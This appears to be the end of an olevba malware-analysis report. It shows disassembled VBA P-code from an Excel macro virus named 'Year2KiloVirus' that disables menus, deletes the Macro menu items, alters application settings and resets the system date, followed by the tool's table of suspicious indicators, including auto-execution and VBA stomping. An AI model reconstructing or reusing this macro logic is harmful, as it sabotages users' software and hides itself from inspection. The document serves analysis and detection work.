' 	MemSt Enabled 
' Line #162:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #163:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #164:
' 	LitVarSpecial (False)
' 	LitDI2 0x0005 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #165:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #166:
' 	LitVarSpecial (False)
' 	LitDI2 0x0007 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #167:
' 	LitVarSpecial (False)
' 	LitDI2 0x0008 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #168:
' 	LitVarSpecial (False)
' 	LitDI2 0x0009 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #169:
' 	EndWith 
' Line #170:
' 	LitVarSpecial (True)
' 	LitDI2 0x0003 
' 	ArgsLd Toolbars 0x0001 
' 	MemSt Visible 
' Line #171:
' 	LitVarSpecial (True)
' 	LitDI2 0x0004 
' 	ArgsLd Toolbars 0x0001 
' 	MemSt Visible 
' Line #172:
' 	LitVarSpecial (True)
' 	LitDI2 0x0005 
' 	ArgsLd Toolbars 0x0001 
' 	MemSt Visible 
' Line #173:
' 	LitVarSpecial (True)
' 	LitDI2 0x0006 
' 	ArgsLd Toolbars 0x0001 
' 	MemSt Visible 
' Line #174:
' 	LitVarSpecial (True)
' 	LitDI2 0x0007 
' 	ArgsLd Toolbars 0x0001 
' 	MemSt Visible 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayFormulaBar 
' Line #176:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #177:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #178:
' 	LitVarSpecial (False)
' 	MemStWith ShowToolTips 
' Line #179:
' 	LitVarSpecial (True)
' 	MemStWith LargeButtons 
' Line #180:
' 	LitVarSpecial (False)
' 	MemStWith ColorButtons 
' Line #181:
' 	EndWith 
' Line #182:
' 	ArgsCall Read 0x0000 
' Line #183:
' 	LitDI2 0x012C 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x000A 
' 	Add 
' 	FnInt 
' 	St MyValuet 
' Line #184:
' 	Ld MyValuet 
' 	Ld ActiveWindow 
' 	MemSt Zoom 
' Line #185:
' 	LitDI2 0x00C8 
' 	LitDI2 0x0010 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0010 
' 	Add 
' 	FnInt 
' 	St MyValuete 
' Line #186:
' 	Ld MyValuete 
' 	Ld Application 
' 	MemSt SheetsInNewWorkbook 
' Line #187:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt MoveAfterReturn 
' Line #188:
' 	Ld xlUp 
' 	Ld Application 
' 	MemSt MoveAfterReturnDirection 
' Line #189:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #190:
' 	LitStr 0x0016 "Year2KiloVirus[Y2K-SP]"
' 	Ld Application 
' 	MemSt UserName 
' Line #191:
' 	LitStr 0x000A "Wide Latin"
' 	Ld Application 
' 	MemSt StandardFont 
' Line #192:
' 	LitStr 0x0002 "36"
' 	Ld Application 
' 	MemSt StandardFontSize 
' Line #193:
' 	LitDI2 0x0001 
' 	ArgsLd Day 0x0001 
' 	St dy 
' Line #194:
' 	LitDI2 0x0001 
' 	ArgsLd Month 0x0001 
' 	St mh 
' Line #195:
' 	LitDI2 0x07BC 
' 	LitStr 0x0001 "/"
' 	Concat 
' 	Ld mh 
' 	Concat 
' 	LitStr 0x0001 "/"
' 	Concat 
' 	Ld dy 
' 	Concat 
' 	St mydate 
' Line #196:
' 	Ld mydate 
' 	St Date 
' Line #197:
' 	OnError (Resume Next) 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #200:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #201:
' 	StartWithExpr 
' 	Ld xlNoDocuments 
' 	ArgsLd MenuBars 0x0001 
' 	With 
' Line #202:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #203:
' 	LitVarSpecial (False)
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #204:
' 	EndWith 
' Line #205:
' 	StartWithExpr 
' 	Ld xlInfo 
' 	ArgsLd MenuBars 0x0001 
' 	With 
' Line #206:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #207:
' 	LitVarSpecial (False)
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #208:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #209:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #210:
' 	LitVarSpecial (False)
' 	LitDI2 0x0005 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #211:
' 	EndWith 
' Line #212:
' 	StartWithExpr 
' 	Ld xlChart 
' 	ArgsLd MenuBars 0x0001 
' 	With 
' Line #213:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #214:
' 	LitVarSpecial (False)
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #215:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #216:
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #217:
' 	LitVarSpecial (False)
' 	LitDI2 0x0005 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #218:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #219:
' 	LitVarSpecial (False)
' 	LitDI2 0x0007 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #220:
' 	LitVarSpecial (False)
' 	LitDI2 0x0008 
' 	ArgsMemLdWith Menus 0x0001 
' 	MemSt Enabled 
' Line #221:
' 	EndWith 
' Line #222:
' 	OnError (Resume Next) 
' Line #223:
' 	LitStr 0x0009 "&Macro..."
' 	LitStr 0x0005 "Tools"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #224:
' 	LitStr 0x0009 "&Macro..."
' 	LitStr 0x0005 "Tools"
' 	Ld xlModule 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #225:
' 	LitStr 0x0009 "&Macro..."
' 	LitStr 0x0005 "Tools"
' 	Ld xlNoDocuments 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #226:
' 	LitStr 0x0009 "&Macro..."
' 	LitStr 0x0005 "Tools"
' 	Ld xlInfo 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #227:
' 	LitStr 0x0009 "&Macro..."
' 	LitStr 0x0005 "Tools"
' 	Ld xlChart 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #228:
' 	QuoteRem 0x0000 0x0046 "//// japanese only ///////////////////////////////////////////////////"
' Line #229:
' 	LitStr 0x0007 "&Ï¸Û..."
' 	LitStr 0x0003 "Â°Ù"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	QuoteRem 0x0041 0x0005 "/////"
' Line #230:
' 	QuoteRem 0x0000 0x0046 "//////////////////////////////////////////////////////////////////////"
' Line #231:
' 	End 
' Line #232:
' 	Label ErrorHandler 
' Line #233:
' 	EndSub 
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

